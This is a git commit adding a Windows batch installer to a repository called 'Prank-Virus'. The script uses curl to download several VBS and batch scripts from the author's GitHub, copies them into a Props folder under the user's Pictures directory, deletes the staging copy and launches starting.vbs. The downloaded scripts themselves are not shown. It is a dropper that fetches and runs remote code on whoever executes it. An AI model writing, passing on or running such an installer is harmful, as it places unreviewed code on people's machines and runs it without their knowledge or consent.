3526e9f830b5975e273a741141548e13d863c11c
PottersGame <69338453+PottersGame@users.noreply.github.com>
2022-02-19 14:56:49 +0100

    Add files via upload

---
+++ Hiden_Zubor/Installer.bat
@@ -0,0 +1,11 @@
+MKDIR %USERPROFILE%\Pictures\Props
+MKDIR \Props
+curl https://raw.githubusercontent.com/PottersGame/Prank-Virus/main/Hiden_Zubor/Props/IconChanger.vbs -o Props\IconChanger.vbs
+curl https://raw.githubusercontent.com/PottersGame/Prank-Virus/main/Hiden_Zubor/Props/Prieskumnik.vbs -o Props\Prieskumnik.vbs
+curl https://raw.githubusercontent.com/PottersGame/Prank-Virus/main/Hiden_Zubor/Props/Programbatbat.bat -o Props\Programbatbat.bat
+curl https://raw.githubusercontent.com/PottersGame/Prank-Virus/main/Hiden_Zubor/Props/starting.vbs -o Props\starting.vbs
+xcopy /e /v Props %USERPROFILE%\Pictures\Props
+del Props
+C:
+CD %USERPROFILE%\Pictures\Props
+starting.vbs -o
